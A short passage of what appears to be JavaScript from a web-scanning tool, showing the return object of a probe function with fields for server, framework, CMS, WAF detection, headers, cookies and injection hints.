    statusCode:    res.status,
    os,
    osConfidence,
    server,
    language,
    framework,
    cms,
    waf,
    wafConfidence: confidence,
    headers:       res.headers,
    cookies,
    responseTime:  res.elapsed,
    bodyLength:    res.body.length,
    bodyPreview:   res.body.slice(0, 400).replace(/\s+/g, " ").trim(),
    redirectUrl,
    injectHints,
  };
}
